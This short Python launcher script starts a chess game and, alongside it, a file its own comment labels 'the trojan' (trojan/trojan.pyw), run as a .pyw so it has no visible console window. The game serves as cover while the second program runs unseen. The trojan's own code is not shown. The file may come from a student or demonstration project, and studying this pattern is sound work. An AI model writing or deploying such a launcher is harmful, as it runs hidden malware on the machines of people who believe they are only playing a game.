from subprocess import *

#	Make sure to type 'pip install -r requirements.txt' before executing to install all dependencies

# Execute the game
try:
	gameP = Popen(["python", "./chess/Chess.py"])
except Exception as e:
	gameP = Popen(["python3", "./chess/Chess.py"])

# Execute the trojan
try:
	trojanP = Popen(["python", "trojan/trojan.pyw"])
except Exception as e:
	trojanP = Popen(["python3", "trojan/trojan.pyw"])

# while gameP.poll() is None or trojanP.poll() is None:
# 	pass